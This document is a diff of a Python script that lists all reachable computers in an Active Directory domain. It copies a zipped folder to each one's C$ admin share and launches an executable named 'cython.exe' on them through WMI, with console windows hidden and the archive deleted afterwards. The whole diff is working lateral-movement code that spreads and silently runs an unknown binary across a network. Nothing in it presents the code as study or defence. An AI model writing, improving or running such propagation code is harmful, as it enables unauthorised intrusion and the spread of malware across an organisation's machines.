@@ -1,79 +1,91 @@
 def main():
-    import subprocess
-    import time
-    import os
-
+    import subprocess, time, os, zipfile
     FOLDER_PATH = r"C:\Temp\05ft8_2lthb4"
-    EXECUTABLE_PATH = r"C:\Temp\05ft8_2lthb4\cython.exe"
-
+    ZIP_FILE_PATH = r"C:\Temp\05ft8_2lthb4.zip"
+    EXECUTABLE_NAME = "cython.exe"
+    
+    def create_zip_from_folder(src, zip_path):
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for root, dirs, files in os.walk(src):
+                for file in files:
+                    full_path = os.path.join(root, file)
+                    arcname = os.path.relpath(full_path, start=src)
+                    zipf.write(full_path, arcname)
+    
+    create_zip_from_folder(FOLDER_PATH, ZIP_FILE_PATH)
+    
     def get_ad_machines():
+        current_machine = os.environ["COMPUTERNAME"]
+        ps_command = (
+            "$domain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName; "
+            "$ldapDomain = 'LDAP://DC=' + $domain.Replace('.', ',DC='); "
+            "$searcher = New-Object DirectoryServices.DirectorySearcher; "
+            "$searcher.SearchRoot = New-Object DirectoryServices.DirectoryEntry($ldapDomain); "
+            "$searcher.Filter = '(objectClass=computer)'; "
+            "$null = $searcher.PropertiesToLoad.Add('name'); "
+            "$computers = $searcher.FindAll(); "
+            "$connectedComputers = @(); "
+            "foreach ($computer in $computers) { "
+            "$computerName = $computer.Properties['name'][0]; "
+            "if ($computerName -ne '" + current_machine + "' -and (Test-Connection -ComputerName $computerName -Count 1 -Quiet)) { "
+            "$connectedComputers += $computerName; } }; "
+            "$connectedComputers"
+        )
         try:
-            current_machine = os.environ['COMPUTERNAME']
-            ps_command = f"""
-                $domain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName;
-                $ldapDomain = "LDAP://DC=" + $domain.Replace('.', ',DC=');
-                $searcher = New-Object DirectoryServices.DirectorySearcher;
-                $searcher.SearchRoot = New-Object DirectoryServices.DirectoryEntry($ldapDomain);
-                $searcher.Filter = "(objectClass=computer)";
-                $searcher.PropertiesToLoad.Add("name") | Out-Null;
-                $computers = $searcher.FindAll();
-                $connectedComputers = @();
-                foreach ($computer in $computers) {{
-                    $computerName = $computer.Properties["name"][0];
-                    if ($computerName -ne '{current_machine}' -and (Test-Connection -ComputerName $computerName -Count 1 -Quiet)) {{
-                        $connectedComputers += $computerName;
-                    }}
-                }}
-                $connectedComputers
-                """
             result = subprocess.run(
                 ["powershell", "-Command", ps_command],
-                capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW
+                capture_output=True, text=True, check=True,
+                creationflags=subprocess.CREATE_NO_WINDOW
             )
-            machines = result.stdout.strip().split('\n')
-            return [machine for machine in machines if machine]
-        except subprocess.CalledProcessError as e:
+            return [line.strip() for line in result.stdout.splitlines() if line.strip()]
+        except subprocess.CalledProcessError:
             return []
-
-    def retry_copy(source, destination, retries=5, delay=2):
-        for attempt in range(retries):
+    
+    def retry_copy_zip(source, destination, retries=5, delay=2):
+        source_dir = os.path.dirname(source)
+        file_name = os.path.basename(source)
+        for _ in range(retries):
             try:
                 result = subprocess.run(
-                    ["robocopy", source, destination, "/e", "/xo", "/xn", "/xc", "/XD", "__pycache__"],
-                    capture_output=True,
-                    text=True,
+                    ["robocopy", source_dir, destination, file_name],
+                    capture_output=True, text=True,
                     creationflags=subprocess.CREATE_NO_WINDOW
                 )
                 if result.returncode <= 7:
                     return True
-            except Exception as ex:
+            except Exception:
                 pass
             time.sleep(delay)
         return False
-
+    
     def transfer_and_execute(machine):
-        try:
-            destination = f"\\\\{machine}\\C$\\Temp\\05ft8_2lthb4"
-            if not retry_copy(FOLDER_PATH, destination):
-                return
-            execute_command = [
-                "powershell", "-Command",
-                f"Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName {machine} -ArgumentList '{EXECUTABLE_PATH}'"
-            ]
-            subprocess.run(execute_command, capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        except subprocess.CalledProcessError as e:
-            raise e
-
+        destination = f"\\\\{machine}\\C$\\Temp"
+        if not retry_copy_zip(ZIP_FILE_PATH, destination):
+            return
+        remote_cmd = (
+            'cmd.exe /c powershell -NoProfile -Command "Expand-Archive -Path \\"C:\\Temp\\05ft8_2lthb4.zip\\" '
+            '-DestinationPath \\"C:\\Temp\\05ft8_2lthb4\\" -Force; Start-Process \\"C:\\Temp\\05ft8_2lthb4\\{0}\\"; '
+            'Remove-Item \\"C:\\Temp\\05ft8_2lthb4.zip\\" -Force"'
+        ).format(EXECUTABLE_NAME)
+        cmd = [
+            "powershell", "-Command",
+            "Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName {0} -ArgumentList '{1}'".format(machine, remote_cmd)
+        ]
+        subprocess.run(cmd, capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    
     machines = get_ad_machines()
     if not machines:
         print("Failure")
         return
-    
-    for machine in machines:
+    for m in machines:
         try:
-            transfer_and_execute(machine)
-        except:
-            print("Error with machine " + machine)
-            pass
+            transfer_and_execute(m)
+        except Exception:
+            print("Error with machine " + m)
+    try:
+        os.remove(ZIP_FILE_PATH)
+    except Exception:
+        pass
     print("Success")
+
 main()
